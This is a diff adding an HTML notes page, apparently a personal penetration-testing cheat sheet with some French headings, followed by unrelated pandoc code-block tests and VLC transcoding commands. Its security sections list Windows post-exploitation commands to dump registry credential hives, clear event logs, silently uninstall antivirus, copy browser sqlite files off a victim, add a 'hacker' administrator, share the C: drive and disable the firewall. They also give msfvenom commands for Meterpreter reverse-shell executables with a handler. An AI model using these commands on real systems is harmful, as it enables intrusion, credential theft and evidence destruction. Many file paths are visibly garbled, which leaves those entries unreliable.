+</tbody></table>
+
+
+<h2 id="files-to-pull-if-possible"><a href="#TOC">FILES TO PULL (IF POSSIBLE)</a></h2>
+<table style="border-collapse: collapse; border: medium none; width: 624px;">
+<colgroup><col width="*"></col><col width="*"></col></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">File location</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Description / Reason</span>
+</td></tr>
+<tr style="height: 68px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMDRIVE%.sys</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%.log</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%6.log (5, 6 or 7)</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%321.log</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%323svc1.log (year month day)</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.Evt</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.Evt</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32*.log</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%USERPROFILE%.dat</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%USERPROFILE%<sub>1</sub>1.IE5.dat</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+</tbody></table>
+
+<h2 id="remote-system-access"><a href="#TOC">REMOTE SYSTEM ACCESS</a></h2>
+<table style="border-collapse: collapse; border: medium none; width: 624px;">
+<colgroup><col width="*"></col><col width="*"></col></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Command</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Description / Reason</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net share \computername</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist /V /S computername</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qwinsta /SERVER:computername</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qprocess /SERVER:computername *</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net use \computername</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net use \computername /user:DOMAINpassword</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system.</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This is useful when you’ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on.</span>
+</td></tr>
+</tbody></table>
+
+<ul>
+<li>net time \computername (Shows the time of target computer)</li>
+<li>dir \computername_or_admin_share  (dir list a remote directory)</li>
+<li>tasklist /V /S computername
+<ul>
+<li>Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount</li>
+</ul></li>
+</ul>
+<h2 id="auto-start-directories"><a href="#TOC">AUTO-START DIRECTORIES</a></h2>
+<table style="border-collapse: collapse; border: medium none;">
+<colgroup><col width="196"></col><col width="476"></col></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows NT 6.1, 6.0</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%Menu&lt;/span&gt;
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows NT 5.2, 5.1, 5,0</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%And SettingsUsersMenu&lt;/span&gt;
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows 9x</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%Menu&lt;/span&gt;
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows NT 4.0, 3.51, 3.50</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%UsersMenu&lt;/span&gt;
+</td></tr>
+</tbody></table>
+
+<h2 id="wmi"><a href="#TOC">WMI</a></h2>
+<ul>
+<li>wmic bios</li>
+<li>wmic qfe</li>
+<li>wmic qfe get hotfixid (This gets patches IDs)</li>
+<li>wmic startup</li>
+<li>wmic service</li>
+<li>wmic os</li>
+<li>wmic process get caption,executablepath,commandline</li>
+<li>wmic process call create “process_name” (executes a program)</li>
+<li>wmic process where name=”process_name” call terminate (terminates program)</li>
+<li>wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)</li>
+<li>wmic useraccount (usernames, sid, and various security related goodies)</li>
+<li>wmic useraccount get /ALL</li>
+<li>wmic share get /ALL (you can use ? for gets help ! )</li>
+<li>wmic startup list full (this can be a huge list!!!)</li>
+<li>wmic /node:“hostname” bios get serialnumber (this can be great for finding warranty info about target)</li>
+</ul>
+<h2 id="reg-command"><a href="#TOC">REG COMMAND</a></h2>
+<ul>
+<li>reg save HKLMsecurity.hive (Save security hive to a file)</li>
+<li>reg save HKLMsystem.hive (Save system hive to a file)</li>
+<li>reg save HKLMsam.hive (Save sam to a file)=</li>
+<li>reg add [\TargetIPaddr] [RegDomain][ ]</li>
+<li>reg export [RegDomain][Key] [FileName]</li>
+<li>reg import [FileName ]</li>
+<li>reg query [\TargetIPaddr] [RegDomain][ Key ] /v [Valuename!] (you can to add /s for recurse all values )</li>
+</ul>
+<h2 id="deleting-logs"><a href="#TOC">DELETING LOGS</a></h2>
+<ul>
+<li>wevtutil el (list logs)</li>
+<li>wevtutil cl <LogName> (Clear specific log)</li>
+<li>del %WINDIR%*.log /a /s /q /f</li>
+</ul>
+<h2 id="uninstalling-software-antivirus-non-interactive"><a href="#TOC">UNINSTALLING SOFTWARE “ANTIVIRUS” (NON INTERACTIVE)</a></h2>
+<ul>
+<li>wmic product get name /value (this gets software names)</li>
+<li>wmic product where name=“XXX” call uninstall /nointeractive (this uninstalls software)</li>
+</ul>
+<h2 id="other-to-be-sorted"><a href="#TOC">OTHER (TO BE SORTED)</a></h2>
+<ul>
+<li>pkgmgr usefull /iu :”Package”</li>
+<li>pkgmgr usefull /iu :”TelnetServer” (Install Telnet Service …)</li>
+<li>pkgmgr /iu:”TelnetClient” (Client )</li>
+<li>rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)</li>
+<li>wscript.exe &lt;script js/vbs&gt;</li>
+<li>cscript.exe &lt;script js/vbs/c#&gt;</li>
+<li>xcopy /C /S %appdata%*.sqlite \your_box_funstuff</li>
+</ul>
+<h2 id="os-specific"><a href="#TOC">OS SPECIFIC</a></h2>
+<ul>
+<li>Win2k3
+<ul>
+<li>winpop stat domainname</li>
+</ul></li>
+<li>Vista/7
+<ul>
+<li>winstat features</li>
+<li>wbadmin get status</li>
+<li>wbadmin get items</li>
+<li>gpresult /H gpols.htm</li>
+<li>bcdedit /export &lt;filename&gt;</li>
+</ul></li>
+</ul>
+<h2 id="invasive-or-altering-commands"><a href="#TOC">INVASIVE OR ALTERING COMMANDS</a></h2>
+<table style="border-collapse: collapse; border: medium none; font-family: &quot;Trebuchet MS&quot;,sans-serif;">
+<colgroup><col width="336"></col><col width="320"></col></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Description</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user hacker hacker /add</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Creats a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators /add hacker</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">or</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators hacker /add</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Adds the new user ‘hacker’ to the local administrators group</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net share nothing$=C: /grant:hacker,FULL /unlimited</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"></span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user username /active:yes /domain</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched.</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netsh firewall set opmode disable</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Disables the local windows firewall</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netsh firewall set opmode enable</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it.</span>
+</td></tr>
+</tbody></table>
+
+
+<h1 id="tests"><a href="#TOC">TESTS</a></h1>
+<h2 id="toto"><a href="#TOC">TOTO</a></h2>
+<p>Here’s what a delimited code block looks like:</p>
+<pre><code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ {.haskell}
+-- | Inefficient quicksort in haskell.
+qsort :: (Enum a) =&gt; [a] -&gt; [a]
+qsort []     = []
+qsort (x:xs) = qsort (filter (&lt; x) xs) ++ [x] ++
+               qsort (filter (&gt;= x) xs) 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code></pre>
+<p>And here’s how it looks after syntax highlighting:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="co">-- | Inefficient quicksort in haskell.</span>
+<span class="ot">qsort ::</span> (<span class="kw">Enum</span> a) <span class="ot">=&gt;</span> [a] <span class="ot">-&gt;</span> [a]
+qsort []     <span class="fu">=</span> []
+qsort (x<span class="fu">:</span>xs) <span class="fu">=</span> qsort (<span class="fu">filter</span> (<span class="fu">&lt;</span> x) xs) <span class="fu">++</span> [x] <span class="fu">++</span>
+               qsort (<span class="fu">filter</span> (<span class="fu">&gt;=</span> x) xs) </code></pre>
+<p>Here’s some python, with numbered lines (specify <code>{.c .numberLines}</code>):</p>
+<table class="sourceCode c numberLines"><tr class="sourceCode"><td class="lineNumbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="sourceCode"><pre><code class="sourceCode c"><span class="co">//This is a Finite State Machine (FSM).</span>
+<span class="co">/* </span>
+<span class="co">**toto</span>
+<span class="co">*/</span>
+
+<span class="dt">int</span> main (<span class="dt">int</span> argc, <span class="dt">char</span>* argv[])
+{
+printf(<span class="st">&quot;toto&quot;</span>);
+
+<span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre></td></tr></table>
+<p>toto</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">qsort [] <span class="fu">=</span> []</code></pre>
+<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> main (<span class="dt">int</span> argc, <span class="dt">char</span>* argv[])
+{
+printf(<span class="st">&quot;toto&quot;</span>);
+
+<span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre>
+<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">echo</span> <span class="st">&quot;toto&quot;</span> <span class="kw">|grep</span> toto</code></pre>
+<h1 id="metasploit"><a href="#TOC">Metasploit</a></h1>
+<h2 id="genration-de-payload-executables"><a href="#TOC">Genration de payload executables</a></h2>
+<h3 id="manuel"><a href="#TOC">Manuel</a></h3>
+<pre><code># msfvenom -h
+Usage: /opt/framework/msf3/msfvenom [options] 
+
+Options:
+    -p, --payload    [payload]       Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads
+    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all
+    -n, --nopsled    [length]        Prepend a nopsled of [length] size on to the payload
+    -f, --format     [format]        Format to output results in: raw, ruby, rb, perl, pl, bash, sh, c, js_be, js_le, java, dll, exe, exe-small, elf, macho, vba, vbs, loop-vbs, asp, war
+    -e, --encoder    [encoder]       The encoder to use
+    -a, --arch       [architecture]  The architecture to use
+        --platform   [platform]      The platform of the payload
+    -s, --space      [length]        The maximum size of the resulting payload
+    -b, --bad-chars  [list]          The list of characters to avoid example: &#39;\x00\xff&#39;
+    -i, --iterations [count]         The number of times to encode the payload
+    -c, --add-code   [path]          Specify an additional win32 shellcode file to include
+    -x, --template   [path]          Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -h, --help                       Show this message</code></pre>
+<h3 id="exemple"><a href="#TOC">Exemple</a></h3>
+<h4 id="lister-les-options-dun-payload"><a href="#TOC">Lister les options d’un payload</a></h4>
+<pre><code># msfvenom -p windows/meterpreter/reverse_tcp -o</code></pre>
+<h4 id="créer-un-payload-meterpreter-pour-windows"><a href="#TOC">Créer un payload meterpreter pour windows</a></h4>
+<pre><code># msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 &gt; windobReverseMeterpreter5555.exe</code></pre>
+<h3 id="alternative"><a href="#TOC">Alternative</a></h3>
+<pre><code># msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe</code></pre>
+<h2 id="lancement-de-handler"><a href="#TOC">Lancement de handler</a></h2>
+<pre><code># msfcli multi/handler LPORT=5555 E
+
+
+use payload/linux/x86/meterpreter/bind_tcp
+
+use payload/windows/meterpreter/bind_tcp
+set LPORT 8888
+show options
+generate -t exe -f /root/meterpreter6666.exe
+exploit
+
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.0.1
+set LPORT 8888
+exploit</code></pre>
+<p>https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools</p>
+<h1 id="vlc"><a href="#TOC">VLC</a></h1>
+<h2 id="transcoding"><a href="#TOC">Transcoding</a></h2>
+<h3 id="vers-mp4"><a href="#TOC">vers MP4</a></h3>
+<pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mpga,ab=192,scale=1,channels=2}:standard{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; 
+&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mp4a}:std{access=file,mux=mp4,dst=&#39;output.mp4&#39;}&quot; </code></pre>
+<h3 id="vers-avi"><a href="#TOC">vers AVI</a></h3>
